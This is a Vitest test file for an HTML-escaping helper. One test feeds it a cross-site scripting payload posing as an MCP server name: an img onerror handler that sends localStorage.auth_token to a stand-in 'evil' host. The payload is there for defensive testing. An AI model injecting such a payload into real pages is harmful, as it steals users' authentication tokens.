import { describe, expect, it } from "vitest";
import { escapeHtml } from "@/lib/html-escape";

describe("escapeHtml", () => {
  it("escapes every character that can open markup or an attribute", () => {
    expect(escapeHtml(`&<>"'`)).toBe("&amp;&lt;&gt;&quot;&#39;");
  });

  it("neutralises a hostile MCP server name", () => {
    const name = `<img src=x onerror="fetch('https://evil/'+localStorage.auth_token)">`;
    const out = escapeHtml(name);
    expect(out).not.toContain("<");
    expect(out).not.toContain(">");
    expect(out).toBe("&lt;img src=x onerror=&quot;fetch(&#39;https://evil/&#39;+localStorage.auth_token)&quot;&gt;");
  });

  it("renders null, undefined and numbers as plain text", () => {
    expect(escapeHtml(null)).toBe("");
    expect(escapeHtml(undefined)).toBe("");
    expect(escapeHtml(42)).toBe("42");
  });
});
